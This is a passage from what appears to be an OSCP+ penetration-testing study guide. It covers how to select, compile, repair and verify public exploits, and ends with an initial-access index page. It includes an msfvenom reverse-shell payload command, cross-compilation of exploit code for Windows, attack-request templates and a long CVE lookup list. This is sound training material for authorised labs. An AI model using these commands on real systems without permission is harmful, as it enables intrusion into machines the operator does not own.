choice follows the target execution context. ## Python exploit workflow After source review: ```bash python3 -m py_compile exploit.py python3 exploit.py --help ``` Isolate explicit dependencies: ```bash python3 -m venv .venv source .venv/bin/activate python -m pip install --upgrade pip python -m pip install -r requirements.txt python -m pip freeze > requirements-resolved.txt ``` > Run `--help` only after confirming that module import and argument handling do not trigger the exploit. Old Python 2 syntax, `str`/`bytes` mistakes, renamed modules and obsolete TLS dependencies are runtime problems, not target evidence. Useful diagnostics: ```bash python3 -X dev exploit.py ARGUMENTS python3 -m trace --trace exploit.py ARGUMENTS ``` Use tracing only when its output is bounded and does not expose credentials. Prefer adding a few prints around the failing request/parser over changing many lines at once. ## Compile reviewed source Linux/ELF program: ```bash gcc -Wall -Wextra exploit.c -o exploit file exploit ldd exploit sha256sum exploit ``` 32-bit output requires matching headers/libraries: ```bash gcc -m32 -Wall -Wextra exploit.c -o exploit32 file exploit32 ``` Windows PE from Kali: ```bash i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe x86_64-w64-mingw32-gcc exploit.c -o exploit-x64.exe file exploit-x86.exe exploit-x64.exe ``` Windows socket code commonly needs the Winsock import library: ```bash i686-w64-mingw32-gcc exploit.c -o exploit-x86.exe -lws2_32 x86_64-w64-mingw32-gcc exploit.c -o exploit-x64.exe -lws2_32 ``` > **Failure cue:** undefined references are linker evidence. Identify the missing symbol and documented library; do not delete calls until the binary compiles. `Exec format error` means the produced format/architecture cannot run in the current environment. ## Make the smallest supported edit Change one assumption at a time and retain a diff: ```bash cp EXPLOIT_FILE EXPLOIT_FILE.orig git diff --no-index -- EXPLOIT_FILE.orig EXPLOIT_FILE ``` Typical adaptations are: | Assumption | Evidence-backed edit | | --- | --- | | Target address/port | Observed reachable endpoint | | HTTP/HTTPS and base path | Reproduced application request | | Virtual host or `Host` header | Resolved application identity | | Username/password/cookie | Valid Block 5 authentication context | | CSRF/session parsing | Actual request/response sequence | | LHOST/LPORT | Address and listener reachable from the target context | | Command or payload | Target OS, interpreter, architecture, size and bad-character constraints | | File path/name | Writable/executable target path and application behavior | | Timeout/retry | Measured service behavior, not blind delay inflation | Do not combine prerequisite repair, payload replacement and parser rewrites in one unreviewable change. ## Repair a web exploit from the real transaction Before changing the script, reproduce the relevant request with Burp or curl and compare: ```bash curl -i -X METHOD 'SCHEME://HOSTNAME:PORT/PATH' \ -H 'Host: HOSTNAME' \ -H 'Cookie: COOKIE' \ --data 'PARAM=VALUE' ``` For a scoped lab with a known self-signed certificate: ```bash curl -k -i 'https://HOSTNAME:PORT/PATH' ``` In Python Requests, use a session when cookies or defaults must persist: ```python with requests.Session() as session: response = session.get(url, timeout=10) print(response.status_code, response.url) print(response.headers) print(response.text[:500]) ``` Set `verify=False` only for a scoped test after confirming the certificate problem; it disables certificate and hostname validation. Prefer a supplied CA bundle when possible. > **Parser cue:** `IndexError`, missing-key and regular-expression failures mean the received response did not have the assumed shape. Print status, final URL, headers and a bounded body fragment before rewriting the parser. Common causes are a changed path, redirect, failed login, CSRF change, error page, proxy/WAF response or certificate handling. ## Adapt an existing memory-corruption PoC only as required > Dedicated overflow development, offset drills and shellcode development are excluded from this speedrun. Use this section only to understand and adapt an existing PoC whose vulnerable build and assumptions are supported by evidence. Review the PoC comments and code for: - exact vulnerable build and target architecture; - hard-coded target/callback address and port; - return address/module assumptions and target profiles; - recorded offset, available payload space and bad characters; - payload architecture, type and exit behavior; - crash/restart and reliability expectations. Replace an embedded payload only when the PoC documents its constraints: ```bash msfvenom -p windows/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f c -v payload \ -b '\x00\x0a\x0d' ``` Use the PoC's actual bad-character and space requirements; the example list is not universal. A changed build, missing module, mitigation or misaligned offset invalidates the PoC and should not trigger a fresh exploit-development detour in this route. ## Prove effects in increasing order ```text exact prerequisites → exploit reaches expected vulnerable path → bounded harmless effect or identity output → repeatable command execution → payload reaches listener → usable session → verified host/identity/privilege/network position ``` Do not accept the exploit's own “success” string as proof. Validate an independent effect. An HTTP `200`, uploaded filename, connection or application crash each proves less than a verified command result. ## Failure routing | Symptom | Interpretation / next action | | --- | --- | | No matching candidate | Improve component/build/configuration evidence; do not force a generic CVE | | PoC requests suspicious local privilege | Stop and audit or use an isolated snapshot | | Import/module error | Reproduce dependencies in a per-tool environment | | Python syntax/bytes error | Resolve runtime-version compatibility before judging the target | | Compiler error | Fix source/header/type problem named by compiler | | Undefined reference | Link the documented library; inspect linker order | | `Exec format error` | Correct producer/consumer OS or architecture | | TLS/certificate failure | Confirm correct HTTPS endpoint; use CA or scoped test override | | Redirect/login/CSRF parser failure | Compare the real browser request and response state | | Exploit says success but effect absent | Treat as unconfirmed; inspect its success condition and target response | | Target crashes | Record stability risk; stop repeating without changed evidence | | Command execution works but no callback | Enter the shell/session diagnostic ladder | ## Handoff and evidence Record the original URL/EDB-ID/CVE/commit, original hash, exact target prerequisites, dependency/compiler state, modified diff, shellcode-generation command if applicable, invocation, raw result and independent verification. The current exam guide requires the original URL, modified code, highlighted changes and explanations when a public exploit is modified. Once command execution is proven, continue with [shells and payloads](../04-shells-transfers-credentials/02-shells-and-payloads.md). Do not make exploit adaptation carry listener, route and TTY problems that belong to the session layer. The current OSCP+ guide restricts Metasploit Auxiliary/Exploit/Post modules and Meterpreter to one selected target; selection is consumed even when the attempt or `check` fails. `msfvenom` and `multi/handler` have across-target exceptions, subject to the Meterpreter limit. AI chatbots are prohibited during the actual exam. ## Component/CVE lookup from the source cheatsheet Use this lookup when enumeration identifies the relevant component. These are candidate/advisory links, not confirmation from a banner. Check the vendor/distribution patch status, exact feature, access and PoC behavior before following the existing adaptation workflow. - **CVE-2014-6271** — CGI/application environment reaches an affected Bash invocation; see the Shellshock request test in Web. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2014-6271). - **CVE-2016-1531** — Local Exim build/configuration exposes the vulnerable privileged Perl-startup path. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2016-1531). - **CVE-2019-14287** — The exact sudo run-as policy permits the affected user-ID handling; inspect sudo -l and package patch level. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2019-14287). - **CVE-2014-5301** — ManageEngine ServiceDesk Plus upload workflow, affected build and credentials required by the chosen PoC. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2014-5301). - **CVE-2015-1328** — Affected Ubuntu OverlayFS/kernel package and user-namespace conditions; check distribution backports. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2015-1328). - **CVE-2016-5195** — Dirty COW kernel race and exact package/backport state; select a reviewed matching PoC and account for file damage. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2016-5195). - **CVE-2017-0144** — Windows SMBv1 implementation and MS17-010 patch state; banner alone is insufficient and exploitation can crash the host. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2017-0144). - **CVE-2018-7600** — Affected Drupal release and reachable Form API processing; identify the application before choosing a PoC. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2018-7600). - **CVE-2019-7214** — Affected SmarterMail build, exposed .NET remoting service and the selected deserialization chain. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2019-7214). - **CVE-2020-11651** — Salt master exposed request server and affected authentication handling; identify service and patch state. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2020-11651). - **CVE-2020-11652** — Salt master file-path validation and the privileges/context required by the selected file-read/write operation. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2020-11652). - **CVE-2020-24186** — Affected WordPress wpDiscuz plugin and reachable comment/upload workflow, not WordPress core alone. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2020-24186). - **CVE-2021-4034** — Installed setuid pkexec/Polkit package and distribution backports; protect the disposable target from PoC side effects. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2021-4034). - **CVE-2022-24112** — Affected Apache APISIX batch-request/admin processing and exact deployment configuration. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2022-24112). - **CVE-2023-24078** — Affected FuguHub version, reachable upload/execution route and account prerequisites of the selected PoC. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2023-24078). - **CVE-2020-1472** — Domain-controller Netlogon implementation/patch state; do not use a DC password-reset exploit as a harmless version probe. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2020-1472). - **CVE-2021-3156** — Affected sudo package and heap-trigger conditions, including distribution backports; use a matching reviewed PoC. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2021-3156). - **CVE-2021-42287** — AD/KDC patch state and the account-creation/object-name prerequisites of the selected NoPac chain. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2021-42287). - **CVE-2021-44228** — The actual Java logging path, affected Log4j component and reachable JNDI/callback context; a DNS hit alone is not RCE. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2021-44228). - **CVE-2022-0847** — Affected Linux kernel and writable-page-cache primitive; confirm build/backports before a Dirty Pipe PoC. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2022-0847). - **CVE-2022-22963** — Spring Cloud Function routing-expression processing; do not confuse it with Spring Framework CVE-2022-22965. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2022-22963). - **CVE-2022-31214** — Affected setuid Firejail build and namespace/join conditions. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2022-31214). - **CVE-2023-21746** — Local Windows NTLM behavior, patch state and the privileged file-operation/consumer chain of LocalPotato. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2023-21746). - **CVE-2023-22809** — Affected sudoedit version plus an editable-file rule and editor environment control. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2023-22809). - **CVE-2023-32629** — Ubuntu kernel packaging/backports and the relevant OverlayFS/user-namespace conditions. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2023-32629). - **CVE-2023-2640** — Ubuntu OverlayFS permission handling and exact kernel packaging; check alongside CVE-2023-32629. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2023-2640). - **CVE-2023-4911** — Affected glibc loader/tunables behavior and a compatible setuid consumer/build. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2023-4911). - **CVE-2023-7028** — GitLab password-reset workflow, release/patch level and actual account/reset-delivery conditions. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2023-7028). - **CVE-2024-4577** — Windows PHP-CGI invocation and relevant best-fit/locale conditions; a PHP version banner alone is insufficient. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2024-4577). - **CVE-2025-29927** — Next.js middleware authorization path and affected deployment/version; verify access to a normally protected route. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2025-29927). - **CVE-2025-32463** — Affected sudo chroot processing and the selected local PoC requirements. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). - **CVE-2025-55182** — Affected React Server Components/server-function processing and the exact deployed dependency/patch level. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2025-55182). - **CVE-2026-24061** — Affected GNU Inetutils telnetd/login environment handling; see the conditional Telnet test in Common services. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2026-24061). - **CVE-2026-46300** — Linux ESP/XFRM/page-cache conditions and the exact patched kernel package; do not adopt a universal-root claim. [CVE record](https://nvd.nist.gov/vuln/detail/CVE-2026-46300). The source also bundles PoCs for ManageEngine ServiceDesk Plus, Drupal, SmarterMail, SaltStack, wpDiscuz, APISIX, FuguHub, FreeSWITCH, Nexus, Symfony, WiFi Mouse, PwnKit, MS17-010 and older Linux local exploits. Match the actual product/feature/build, then inspect the original script with the runtime/argument checks above. The bundled payload binaries and precompiled helpers are not automatically the correct architecture/runtime or a trustworthy build for your target. [0xsyr0 exploit files](https://github.com/0xsyr0/OSCP/tree/main/exploits) · [Source CVE recipes](https://github.com/0xsyr0/OSCP#cve) BadSuccessor/dMSA and container-escape examples have additional object/platform/configuration requirements. Treat them as conditional candidates when those exact features are observed, rather than default steps after obtaining any domain identity or container shell. Sources: [upstream 1](https://github.com/0xsyr0/OSCP#cve) · [upstream 2](https://www.microsoft.com/en-us/security/blog/2026/05/08/active-attack-dirty-frag-linux-vulnerability-expands-post-compromise-risk/) · [upstream 3](https://aws.amazon.com/security/security-bulletins/2026-029-aws/). ## Sources - Supplied PEN-200 Ch 13 pp375-392 and Ch 14 pp393-415 - [Current OSCP+ Body of Knowledge](https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge) - [Current OSCP+ exam guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) - [SearchSploit manual](https://www.exploit-db.com/searchsploit) - [Nmap NSE documentation](https://nmap.org/book/nse.html) - [Python virtual environments](https://docs.python.org/3/library/venv.html) - [Requests advanced usage](https://requests.readthedocs.io/en/latest/user/advanced/) - [Metasploit msfvenom documentation](https://github.com/rapid7/metasploit-framework/blob/master/docs/metasploit-framework.wiki/How-to-use-msfvenom.md)

# Stage 03: Initial Access

[← Main index](../../README.md) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Turn application weaknesses into access](../../notes/methods/web-exploitation.md); [Select and adapt public exploits](../../notes/methods/public-exploits.md); [Establish sessions and move files](../../notes/methods/sessions-transfers.md); [Move to another host](../../notes/methods/lateral-movement.md)

> **Purpose:** convert a validated service/application primitive into useful access or verified execution, then establish and verify the resulting session or application privilege.

| Task | Use it to |
| --- | --- |
| [RDP access](01-rdp-access.md) | Connect to an assigned Windows host and recognize the resulting source position |
| [Web file handling](02-web-file-handling.md) | Separate traversal, inclusion, upload/write and executable handling |
| [Command and SQL injection](03-command-and-sql-injection.md) | Prove OS command execution or manually exploit SQL query control |
| [Access control and XSS](04-access-control-and-xss.md) | Validate object/role/API weaknesses and useful browser-context execution |
| [WordPress and SSRF](05-wordpress-and-ssrf.md) | Map WordPress capabilities/components and prove server-side fetching/internal reachability |
| [Public exploit selection and adaptation](06-public-exploit-adaptation.md) | Match a PoC to exact prerequisites, audit it, repair runtime/code assumptions and independently verify its effect |

> **Exit condition:** useful application privilege or operating-system execution is verified under a named identity/context. After OS access, verify host and identity, re-enumerate, and hand session reliability to Block 7; use [file transfer](../04-shells-transfers-credentials/01-file-transfer.md) when tools or evidence must cross hosts.
